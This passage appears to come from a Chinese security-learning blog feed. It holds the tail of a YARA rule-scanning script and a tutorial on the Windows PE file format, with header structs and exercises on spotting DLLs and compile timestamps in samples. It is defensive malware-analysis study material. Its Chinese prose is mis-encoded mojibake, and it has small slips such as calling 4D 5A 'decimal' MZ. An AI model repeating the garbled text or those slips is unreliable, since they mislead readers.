</span><br><span class="line">  yararule = yara.<span class="built_in">compile</span>(filepaths=filepath)</span><br><span class="line">  print(filepath)</span><br><span class="line">  print(yararule)</span><br><span class="line">  <span class="keyword">return</span> yararule</span><br><span class="line">  </span><br><span class="line"><span class="comment"># æ‰«æå‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">rule, path</span>):</span></span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">    mapath = os.path.join(path, file)</span><br><span class="line">    <span class="built_in">print</span> (malpath+<span class="string">&quot;\\&quot;</span>+file)</span><br><span class="line">    fp = <span class="built_in">open</span>(malpath+<span class="string">&quot;\\&quot;</span>+file, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    matches = rule.match(data=fp.read())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(matches) &gt; <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">print</span> (file, matches)</span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  rulepath = <span class="string">&quot;F:\\yara\\rules&quot;</span> <span class="comment"># yaraè§„åˆ™ç›®å½•</span></span><br><span class="line">  malpath =<span class="string">&quot;F:\\yara\\samples&quot;</span> <span class="comment"># simpleç›®å½•</span></span><br><span class="line">  <span class="comment"># yaraè§„åˆ™ç¼–è¯‘å‡½æ•°è°ƒç”¨</span></span><br><span class="line">  yararule = getRules(rulepath)</span><br><span class="line">  <span class="comment"># æ‰«æå‡½æ•°è°ƒç”¨</span></span><br><span class="line">  scan(yararule, malpath)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lengjibo.github.io&#x2F;yara&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;zhuanlan.kanxue.com&#x2F;article-17369.htm</span><br><span class="line">https:&#x2F;&#x2F;toutiao.io&#x2F;posts&#x2F;05scc8&#x2F;preview</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>PEç»“æ„å­¦ä¹ </title>
    <url>/posts/d8527941/</url>
    <content><![CDATA[<h3 id="PEæ–‡ä»¶ç»“æ„"><a href="#PEæ–‡ä»¶ç»“æ„" class="headerlink" title="PEæ–‡ä»¶ç»“æ„"></a>PEæ–‡ä»¶ç»“æ„</h3><h4 id="1-å¯æ‰§è¡Œæ–‡ä»¶"><a href="#1-å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="1.å¯æ‰§è¡Œæ–‡ä»¶"></a>1.å¯æ‰§è¡Œæ–‡ä»¶</h4><p>åœ¨windowså¹³å°ä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„æ ¼å¼ï¼Œæˆä¸ºPEæ–‡ä»¶ç»“æ„ï¼ˆPortable Executableï¼‰ï¼›</p>
<p>åœ¨Linuxå¹³å°ä¸‹çš„å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼æˆä¸ºELFæ–‡ä»¶ç»“æ„ï¼ˆExecutable and Linking Formatï¼‰</p>
<br>

<h4 id="2-PEæŒ‡çº¹"><a href="#2-PEæŒ‡çº¹" class="headerlink" title="2.PEæŒ‡çº¹"></a>2.PEæŒ‡çº¹</h4><p>åœ¨åˆå§‹ä½ç½®ä¸º 4D 5A ï¼ˆåè¿›åˆ¶ä¸ºMZï¼‰ è€Œåœ¨0x3cå æœ‰ä¸€ä¸ª0x0100hï¼ˆï¼‰ æŒ‡å‘0x0100hï¼ˆPEï¼‰å¤„</p>
<p><img src="/posts/d8527941/1.png"></p>
<br>

<h4 id="3-PEæ•´ä½“ç»“æ„"><a href="#3-PEæ•´ä½“ç»“æ„" class="headerlink" title="3.PEæ•´ä½“ç»“æ„"></a>3.PEæ•´ä½“ç»“æ„</h4><p>ä¸‹å›¾æ˜¯åœ¨githubä¸Šå¤§ä½¬æ»´æ°´çš„å­¦ä¹ ç¬”è®°ä¸Šæˆªçš„</p>
<p><img src="/posts/d8527941/2.png"></p>
<p><img src="/posts/d8527941/3.png"></p>
<br>

<p>åœ¨visual studioä¸­ å¯ä»¥è°ƒç”¨ &lt;windows.h&gt;å»æŸ¥çœ‹PEçš„ç»“æ„ä½“</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">_IMAGE_DOS_HEADER;</span><br><span class="line">_IMAGE_NT_HEADERS;</span><br><span class="line">_IMAGE_SECTION_HEADER</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­WORDç±»å‹ å 2å­—èŠ‚ï¼›DOWRDç±»å‹ å 4ä¸ªå­—èŠ‚ï¼›BYTEç±»å‹ å 1ä¸ªå­—èŠ‚</p>
<p>ä¹Ÿå¯ä»¥è°ƒç”¨pythonä¸­çš„<code>pefile</code>åº“æŸ¥çœ‹peæ–‡ä»¶ç»“æ„ (pip install pefile)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"></span><br><span class="line">pe = pefile.PE(<span class="string">&#x27;1.exe&#x27;</span>)</span><br><span class="line">print(pe)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/d8527941/4.png"></p>
<br>

<h4 id="4-PEæ–‡ä»¶æ•´ä½“ç»“æ„è§£æ"><a href="#4-PEæ–‡ä»¶æ•´ä½“ç»“æ„è§£æ" class="headerlink" title="4.PEæ–‡ä»¶æ•´ä½“ç»“æ„è§£æ"></a>4.PEæ–‡ä»¶æ•´ä½“ç»“æ„è§£æ</h4><h5 id="4-1-DOSå¤´"><a href="#4-1-DOSå¤´" class="headerlink" title="4.1 DOSå¤´"></a>4.1 DOSå¤´</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      &#x2F;&#x2F; DOS .EXE header</span><br><span class="line">    WORD   e_magic;                     &#x2F;&#x2F; Magic number</span><br><span class="line">    WORD   e_cblp;                      &#x2F;&#x2F; Bytes on last page of file</span><br><span class="line">    WORD   e_cp;                        &#x2F;&#x2F; Pages in file</span><br><span class="line">    WORD   e_crlc;                      &#x2F;&#x2F; Relocations</span><br><span class="line">    WORD   e_cparhdr;                   &#x2F;&#x2F; Size of header in paragraphs</span><br><span class="line">    WORD   e_minalloc;                  &#x2F;&#x2F; Minimum extra paragraphs needed</span><br><span class="line">    WORD   e_maxalloc;                  &#x2F;&#x2F; Maximum extra paragraphs needed</span><br><span class="line">    WORD   e_ss;                        &#x2F;&#x2F; Initial (relative) SS value</span><br><span class="line">    WORD   e_sp;                        &#x2F;&#x2F; Initial SP value</span><br><span class="line">    WORD   e_csum;                      &#x2F;&#x2F; Checksum</span><br><span class="line">    WORD   e_ip;                        &#x2F;&#x2F; Initial IP value</span><br><span class="line">    WORD   e_cs;                        &#x2F;&#x2F; Initial (relative) CS value</span><br><span class="line">    WORD   e_lfarlc;                    &#x2F;&#x2F; File address of relocation table</span><br><span class="line">    WORD   e_ovno;                      &#x2F;&#x2F; Overlay number</span><br><span class="line">    WORD   e_res[4];                    &#x2F;&#x2F; Reserved words</span><br><span class="line">    WORD   e_oemid;                     &#x2F;&#x2F; OEM identifier (for e_oeminfo)</span><br><span class="line">    WORD   e_oeminfo;                   &#x2F;&#x2F; OEM information; e_oemid specific</span><br><span class="line">    WORD   e_res2[10];                  &#x2F;&#x2F; Reserved words</span><br><span class="line">    LONG   e_lfanew;                    &#x2F;&#x2F; File address of new exe header</span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure>

<p> WORD   e_magic;                         // Magic number æ ‡å¿—ä½(MZ 4D5A å 2ä¸ªå­—èŠ‚)</p>
<p>Long  e_lfanew;                            // File address of new exe header åç§»ä½ç½®ï¼ˆæŒ‡å‘ä¸‹ä¸€ä¸ªæ–‡ä»¶å‰é¢ï¼‰</p>
<br>

<h5 id="4-2-PE-NT-æ–‡ä»¶å¤´"><a href="#4-2-PE-NT-æ–‡ä»¶å¤´" class="headerlink" title="4.2 PE(NT)æ–‡ä»¶å¤´"></a>4.2 PE(NT)æ–‡ä»¶å¤´</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class="line">    DWORD Signature;                        &#x2F;&#x2F;PEæ ‡è¯†</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;           &#x2F;&#x2F;æ ‡å‡†PEå¤´</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; &#x2F;&#x2F;æ‹“å±•PEå¤´</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€éƒ¨åˆ†ä¸ºPEæ–‡ä»¶å¤´æ ‡å¿—ï¼Œ<code>DWORD Signature;</code> ï¼ˆ50450000 dowrdå 4ä¸ªå­—èŠ‚ï¼‰</p>
<h6 id="4-2-1-æ ‡å‡†PEå¤´"><a href="#4-2-1-æ ‡å‡†PEå¤´" class="headerlink" title="4.2.1 æ ‡å‡†PEå¤´"></a>4.2.1 æ ‡å‡†PEå¤´</h6><p>ç¬¬äºŒéƒ¨åˆ†ä¸º<code>IMAGE_FILE_HEADER</code> å 20å­—èŠ‚ ç§°ä¹‹ä¸ºæ ‡å‡†PEå¤´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123;</span><br><span class="line">    WORD    Machine;                      &#x2F;&#x2F;è¯†åˆ«CPU</span><br><span class="line">    WORD    NumberOfSections;             &#x2F;&#x2F;è¡¨ç¤ºèŠ‚çš„æ•°é‡</span><br><span class="line">    DWORD   TimeDateStamp;                &#x2F;&#x2F;æ—¶é—´æˆ³</span><br><span class="line">    DWORD   PointerToSymbolTable;         &#x2F;&#x2F;è°ƒè¯•ç›¸å…³</span><br><span class="line">    DWORD   NumberOfSymbols;              &#x2F;&#x2F;è°ƒè¯•ç›¸å…³</span><br><span class="line">    WORD    SizeOfOptionalHeader;         &#x2F;&#x2F;æ‹“å±•PEå¤´çš„å¤§å°</span><br><span class="line">    WORD    Characteristics;              &#x2F;&#x2F;æ–‡ä»¶å±æ€§</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; </span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªæˆå‘˜ <code>WORD Machine</code> CPUè¯†åˆ«</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define IMAGE_FILE_MACHINE_UNKNOWN 0</span><br><span class="line">#define IMAGE_FILE_MACHINE_TARGET_HOST 0x0001 &#x2F;&#x2F; Useful for indicating we want to interact with the host and not a WoW guest.</span><br><span class="line">#define IMAGE_FILE_MACHINE_I386 0x014c &#x2F;&#x2F; Intel 386.</span><br><span class="line">#define IMAGE_FILE_MACHINE_R3000 0x0162 &#x2F;&#x2F; MIPS little-endian,</span><br><span class="line">0x160 big-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_R4000 0x0166 &#x2F;&#x2F; MIPS little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_R10000 0x0168 &#x2F;&#x2F; MIPS little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_WCEMIPSV2 0x0169 &#x2F;&#x2F; MIPS little-endian WCEv2</span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA 0x0184 &#x2F;&#x2F; Alpha_AXP</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3 0x01a2 &#x2F;&#x2F; SH3 little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3DSP 0x01a3</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH3E 0x01a4 &#x2F;&#x2F; SH3E little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH4 0x01a6 &#x2F;&#x2F; SH4 little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_SH5 0x01a8 &#x2F;&#x2F; SH5</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARM 0x01c0 &#x2F;&#x2F; ARM Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_THUMB 0x01c2 &#x2F;&#x2F; ARM Thumb&#x2F;Thumb-2Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARMNT 0x01c4 &#x2F;&#x2F; ARM Thumb-2 LittleEndian</span><br><span class="line">#define IMAGE_FILE_MACHINE_AM33 0x01d3</span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPC 0x01F0 &#x2F;&#x2F; IBM PowerPC LittleEndian</span><br><span class="line">#define IMAGE_FILE_MACHINE_POWERPCFP 0x01f1</span><br><span class="line">#define IMAGE_FILE_MACHINE_IA64 0x0200 &#x2F;&#x2F; Intel 64</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPS16 0x0266 &#x2F;&#x2F; MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_ALPHA64 0x0284 &#x2F;&#x2F; ALPHA64</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU 0x0366 &#x2F;&#x2F; MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_MIPSFPU16 0x0466 &#x2F;&#x2F; MIPS</span><br><span class="line">#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64</span><br><span class="line">#define IMAGE_FILE_MACHINE_TRICORE 0x0520 &#x2F;&#x2F; Infineon</span><br><span class="line">#define IMAGE_FILE_MACHINE_CEF 0x0CEF</span><br><span class="line">#define IMAGE_FILE_MACHINE_EBC 0x0EBC &#x2F;&#x2F; EFI Byte Code</span><br><span class="line">#define IMAGE_FILE_MACHINE_AMD64 0x8664 &#x2F;&#x2F; AMD64 (K8)</span><br><span class="line">#define IMAGE_FILE_MACHINE_M32R 0x9041 &#x2F;&#x2F; M32R little-endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_ARM64 0xAA64 &#x2F;&#x2F; ARM64 Little-Endian</span><br><span class="line">#define IMAGE_FILE_MACHINE_CEE 0xC0EE</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªæˆå‘˜ <code>WORD NumberOfSections</code> è¡¨ç¤ºå½“å‰PEæ–‡ä»¶ä¸­èŠ‚çš„æ•°é‡</p>
<p>ç¬¬ä¸‰ä¸ªæˆå‘˜<code>DWORD TimeDateStamp</code>    è¡¨ç¤ºç¼–è¯‘å™¨ç¼–è¯‘æ—¶çš„æ—¶é—´æˆ³</p>
<p>ç¬¬å››ä¸ªæˆå‘˜<code>DWORD PointerToSymbolTable</code> å’Œç¬¬äº”ä¸ªæˆå‘˜<code>DWORD NumberOfSymbols</code>ä¸ºè°ƒè¯•ç›¸å…³æš‚ä¸å»äº†è§£</p>
<p>ç¬¬å…­ä¸ªæˆå‘˜<code>WORD SizeOfOptionalHeader</code> è¡¨ç¤ºPEæ‹“å±•å¤´çš„å¤§å°</p>
<p>ç¬¬ä¸ƒä¸ªæˆå‘˜<code>WORD Characteristics;</code> è¡¨ç¤ºå½“å‰PEæ–‡ä»¶å±æ€§</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define IMAGE_FILE_RELOCS_STRIPPED           0x0001  &#x2F;&#x2F; Relocation info stripped from file.</span><br><span class="line">#define IMAGE_FILE_EXECUTABLE_IMAGE          0x0002  &#x2F;&#x2F; File is executable  (i.e. no unresolved external references).</span><br><span class="line">#define IMAGE_FILE_LINE_NUMS_STRIPPED        0x0004  &#x2F;&#x2F; Line nunbers stripped from file.</span><br><span class="line">#define IMAGE_FILE_LOCAL_SYMS_STRIPPED       0x0008  &#x2F;&#x2F; Local symbols stripped from file.</span><br><span class="line">#define IMAGE_FILE_AGGRESIVE_WS_TRIM         0x0010  &#x2F;&#x2F; Aggressively trim working set</span><br><span class="line">#define IMAGE_FILE_LARGE_ADDRESS_AWARE       0x0020  &#x2F;&#x2F; App can handle &gt;2gb addresses</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_LO         0x0080  &#x2F;&#x2F; Bytes of machine word are reversed.</span><br><span class="line">#define IMAGE_FILE_32BIT_MACHINE             0x0100  &#x2F;&#x2F; 32 bit word machine.</span><br><span class="line">#define IMAGE_FILE_DEBUG_STRIPPED            0x0200  &#x2F;&#x2F; Debugging info stripped from file in .DBG file</span><br><span class="line">#define IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP   0x0400  &#x2F;&#x2F; If Image is on removable media, copy and run from the swap file.</span><br><span class="line">#define IMAGE_FILE_NET_RUN_FROM_SWAP         0x0800  &#x2F;&#x2F; If Image is on Net, copy and run from the swap file.</span><br><span class="line">#define IMAGE_FILE_SYSTEM                    0x1000  &#x2F;&#x2F; System File.</span><br><span class="line">#define IMAGE_FILE_DLL                       0x2000  &#x2F;&#x2F; File is a DLL.</span><br><span class="line">#define IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  &#x2F;&#x2F; File should only be run on a UP machine</span><br><span class="line">#define IMAGE_FILE_BYTES_REVERSED_HI         0x8000  &#x2F;&#x2F; Bytes of machine word are reversed.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h6 id="4-2-2-æ‹“å±•PEå¤´"><a href="#4-2-2-æ‹“å±•PEå¤´" class="headerlink" title="4.2.2 æ‹“å±•PEå¤´"></a>4.2.2 æ‹“å±•PEå¤´</h6><p>ç¬¬ä¸‰éƒ¨åˆ†ä¸º<code>_IMAGE_OPTIONAL_HEADER</code> PEå¯é€‰å¤´ï¼Œåœ¨32ä½ä¸‹æ˜¯224å­—èŠ‚ï¼Œåœ¨64ä½ä¸‹æ˜¯240å­—èŠ‚,ä¸‹é¢ä½32ä½ä¸‹çš„æ‹“å±•PEå¤´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    &#x2F;&#x2F; Standard fields.</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    WORD    Magic;                  &#x2F;&#x2F;æ–‡ä»¶ç±»å‹æ ‡è¯†  0x10B 32ä½é•œåƒæ–‡ä»¶ 0x20B;0x107 ROMé•œåƒ ;64ä½é•œåƒæ–‡ä»¶</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;             &#x2F;&#x2F; .textæ€»å¤§å°</span><br><span class="line">    DWORD   SizeOfInitializedData;  &#x2F;&#x2F; .dataæ€»å¤§å°</span><br><span class="line">    DWORD   SizeOfUninitializedData;&#x2F;&#x2F; .bssæ€»å¤§å°</span><br><span class="line">    DWORD   AddressOfEntryPoint;    &#x2F;&#x2F; ç¨‹åºè™šæ‹Ÿå…¥å£åœ°å€</span><br><span class="line">    DWORD   BaseOfCode;             &#x2F;&#x2F; ä»£ç åŸºå€</span><br><span class="line">    DWORD   BaseOfData;             &#x2F;&#x2F; æ•°æ®åŸºå€</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    &#x2F;&#x2F; NT additional fields.</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    DWORD   ImageBase;              &#x2F;&#x2F; ç¨‹åºå…¥å£   dllé»˜è®¤æ˜¯10000000h windwos ceçš„exeé»˜è®¤æ˜¯00010000h windowsç³»åˆ—exeé»˜è®¤æ˜¯004000000h</span><br><span class="line">    DWORD   SectionAlignment;       &#x2F;&#x2F; å†…å­˜å¯¹é½</span><br><span class="line">    DWORD   FileAlignment;          &#x2F;&#x2F; æ–‡ä»¶å¯¹é½</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;      </span><br><span class="line">    DWORD   SizeOfImage;            &#x2F;&#x2F; PEæ€»å¤§å°</span><br><span class="line">    DWORD   SizeOfHeaders;          &#x2F;&#x2F; å¤´çš„æ€»å¤§å°</span><br><span class="line">    DWORD   CheckSum;               &#x2F;&#x2F; æ ¡éªŒå’Œ(ç”¨äºæ£€æµ‹æ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹)</span><br><span class="line">    WORD    Subsystem;              </span><br><span class="line">    WORD    DllCharacteristics;     &#x2F;&#x2F;dllæ–‡ä»¶ç‰¹æ€§</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p>WORD Magic;æ–‡ä»¶ç±»å‹æ ‡è¯†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x10Bè¡¨æ˜è¿™æ˜¯ä¸€ä¸ª32ä½é•œåƒæ–‡ä»¶ã€‚</span><br><span class="line">0x107è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªROMé•œåƒã€‚</span><br><span class="line">0x20Bè¡¨æ˜è¿™æ˜¯ä¸€ä¸ª64ä½é•œåƒæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure>

<p><code>BYTE MajorLinkerVersion;</code> é“¾æ¥å™¨ä¸»ç‰ˆæœ¬å·ï¼ˆBYTE 2ä½16ï¼‰ </p>
<p><code>BYTE MinorLinkerVersion;</code> é“¾æ¥å™¨å‰¯ç‰ˆæœ¬å· </p>
<p><code>DWORD SizeOfCode;</code> .textæ€»å¤§å° </p>
<p><code>DWORD SizeOfInitializedData;</code> .dataæ€»å¤§å° </p>
<p><code>DWORD SizeOfUninitializedData;</code> .bssæ€»å¤§å° </p>
<p>bssï¼šBSSæ®µé€šå¸¸æ˜¯æŒ‡ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­æœªåˆå§‹åŒ–çš„æˆ–è€…åˆå§‹åŒ–ä¸º0çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚ç‰¹ç‚¹æ˜¯å¯è¯»å†™çš„ï¼Œåœ¨ç¨‹åºæ‰§è¡Œä¹‹å‰BSSæ®µä¼šè‡ªåŠ¨æ¸…0ã€‚</p>
<br>

<p><code>WORD  DllCharacteristics; </code> PEæ–‡ä»¶ç‰¹æ€§</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE 0x0040     &#x2F;&#x2F; DLL can move.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY    0x0080     &#x2F;&#x2F; Code Integrity Image</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NX_COMPAT    0x0100     &#x2F;&#x2F; Image is NX compatible</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_ISOLATION 0x0200     &#x2F;&#x2F; Image understands isolation and doesn&#39;t want it</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_SEH       0x0400     &#x2F;&#x2F; Image does not use SEH.  No SE handler may reside in this image</span><br><span class="line">&#x2F;&#x2F;sehçš„ä¿æŠ¤æœºåˆ¶</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_NO_BIND      0x0800     &#x2F;&#x2F; Do not bind this image.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_APPCONTAINER 0x1000     &#x2F;&#x2F; Image should execute in an AppContainer</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_WDM_DRIVER   0x2000     &#x2F;&#x2F; Driver uses WDM model</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_GUARD_CF     0x4000     &#x2F;&#x2F; Image supports Control Flow Guard.</span><br><span class="line">#define IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE     0x8000</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h4 id="4-3-PEèŠ‚è¡¨"><a href="#4-3-PEèŠ‚è¡¨" class="headerlink" title="4.3 PEèŠ‚è¡¨"></a>4.3 PEèŠ‚è¡¨</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];    &#x2F;&#x2F;èŠ‚å</span><br><span class="line">    union &#123; &#x2F;&#x2F;äºŒé€‰ä¸€ é€šå¸¸é€‰åè€…ï¼ŒéŸ³ä¹ä¸çŸ¥é“å…·ä½“ç‰©ç†åœ°å€</span><br><span class="line">            DWORD   PhysicalAddress;          &#x2F;&#x2F;æœ¬èŠ‚ç‰©ç†åœ°å€</span><br><span class="line">            DWORD   VirtualSize;              &#x2F;&#x2F;æœ¬èŠ‚å®é™…å¤§å°  </span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;                   &#x2F;&#x2F;åœ¨å†…å­˜ä¸­çš„åç§»åœ°å€  åŠ ä¸ŠImageBaseæ‰æ˜¯å†…å­˜çš„çœŸæ­£åœ°å€</span><br><span class="line">    DWORD   SizeOfRawData;                    &#x2F;&#x2F;æœ¬èŠ‚åœ¨ç£ç›˜ä¸­çš„å¤§å°</span><br><span class="line">    DWORD   PointerToRawData;                 &#x2F;&#x2F;æœ¬èŠ‚åœ¨ç£ç›˜ä¸­çš„åç§»é‡</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;                  &#x2F;&#x2F;èŠ‚çš„å±æ€§</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<p>â€¦. </p>
<br>

<br>

<br>

<h4 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h4><h5 id="1-åˆ¤æ–­æ ·æœ¬ä¸ºdllè¿˜æ˜¯exe"><a href="#1-åˆ¤æ–­æ ·æœ¬ä¸ºdllè¿˜æ˜¯exe" class="headerlink" title="1.åˆ¤æ–­æ ·æœ¬ä¸ºdllè¿˜æ˜¯exe"></a>1.åˆ¤æ–­æ ·æœ¬ä¸ºdllè¿˜æ˜¯exe</h5><p>æ ·æœ¬3çš„æ–‡ä»¶ç‰¹å¾ä½ 0x2102 æ ¹æ®æ–‡ä»¶ç‰¹å¾è¡¨  0x2000ï¼ˆdllï¼‰+0x0100(32ä½)+0x0002ï¼ˆå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ </p>
<p>è¯´æ˜è¯¥æ–‡ä»¶ä¸ºä¸€ä¸ªå¯æ‰§è¡Œçš„32ä½dllæ–‡ä»¶</p>
<p><img src="/posts/d8527941/5.png"></p>
<p>æ ·æœ¬4çš„æ–‡ä»¶ç‰¹å¾ä¸º0x0103 å³(0x0100+ 0x0002+0x0001) è¯´æ˜æ˜¯ä¸€ä¸ª32ä½å¯æ‰§è¡Œçš„exe</p>
<p><img src="/posts/d8527941/6.png"></p>
<p>å› æ­¤å¯ä»¥åˆ¤æ–­æ ·æœ¬3ä¸ºdllæ–‡ä»¶ï¼Œæ ·æœ¬4ä¸ºexeæ–‡ä»¶ï¼ˆå¦‚æœä¸ºXX 01å°±æ˜¯ä¸€ä¸ªexeæ–‡ä»¶ï¼Œå¦‚æœæ˜¯XX 2Xè¯´æ˜æ˜¯dllæ–‡ä»¶ï¼‰</p>
<h5 id="2-è®¡ç®—æ ·æœ¬çš„ç¼–è¯‘æ—¶é—´"><a href="#2-è®¡ç®—æ ·æœ¬çš„ç¼–è¯‘æ—¶é—´" class="headerlink" title="2.è®¡ç®—æ ·æœ¬çš„ç¼–è¯‘æ—¶é—´"></a>2.è®¡ç®—æ ·æœ¬çš„ç¼–è¯‘æ—¶é—´</h5><p>æ—¶é—´æˆ³åœ¨NTå¤´å</p>
<p><img src="/posts/d8527941/7.png"></p>
<br>

<p><img src="/posts/d8527941/9.png"></p>
<p>å¯æ ¹æ®æ­¤æ‰¾åˆ°æ ·æœ¬3çš„æ—¶é—´æˆ³ä¸º <code>0x169FCED5</code>   åé¢ 0x00E0 -&gt; 224 è¯´æ˜æ˜¯32ä½ </p>
<p>è®¡ç®—æ–¹æ³•å¦‚ä¸‹</p>
<p><img src="/posts/d8527941/10.png"></p>
<br>

<p><img src="/posts/d8527941/11.png"></p>
<br>

